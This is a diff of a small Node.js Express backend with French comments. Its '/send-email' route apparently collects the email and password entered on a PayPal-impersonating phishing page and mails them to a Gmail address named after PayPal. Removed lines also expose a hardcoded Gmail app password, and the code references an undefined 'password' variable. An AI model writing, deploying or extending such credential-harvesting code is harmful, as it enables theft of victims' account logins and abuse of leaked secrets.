@@ -3,37 +3,47 @@ const nodemailer = require('nodemailer');
 const cors = require('cors');
 
 const app = express();
-app.use(cors());
-app.use(express.json());
+const PORT = process.env.PORT || 3000;
 
-// Configurer Nodemailer avec Gmail (SMTP)
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: 'services.inli.paypal@gmail.com', // Remplace par ton email
-    pass: 'sucx eqsl dcsb oafb', // 🔴 Mot de passe d'application (pas ton mot de passe Gmail normal !)
-  },
-});
+// Middleware
+app.use(cors()); // Autorise les requêtes depuis n'importe quel domaine
+app.use(express.json()); // Permet de lire les données JSON envoyées
 
 // Route pour envoyer un email
 app.post('/send-email', async (req, res) => {
-  const { email, message } = req.body;
+  const { name, email, message } = req.body;
+
+  // Configuration du transporteur Gmail
+  const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: process.env.GMAIL_USER, // Utilise une variable d'environnement
+      pass: process.env.GMAIL_APP_PASSWORD, // Mot de passe d'application Gmail
+    },
+  });
 
   const mailOptions = {
-    from: 'services.inli.paypal@gmail.com',
-    to: 'services.inli.paypal@gmail.com', // Email où tu veux recevoir les messages
-    subject: `Nouvel coordonnée payapl`,
-    text: `Email: ${email}\nMots de passe: ${password}`,
+    from: process.env.GMAIL_USER,
+    to: 'service.inli.paypal@gmail.com', // Email où tu veux recevoir les messages
+    subject: `Nouveau message de ${name}`,
+    text: `Email: ${email}\n\nMots de passe: ${password}`,
   };
 
   try {
     await transporter.sendMail(mailOptions);
-    res.status(200).send('Email envoyé !');
+    res.status(200).json({ success: true });
   } catch (error) {
     console.error(error);
-    res.status(500).send('Erreur lors de l’envoi');
+    res.status(500).json({ error: 'Erreur lors de l’envoi' });
   }
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+// Route de test
+app.get('/', (req, res) => {
+  res.send('Backend fonctionnel sur Render ! 🚀');
+});
+
+// Démarrer le serveur
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
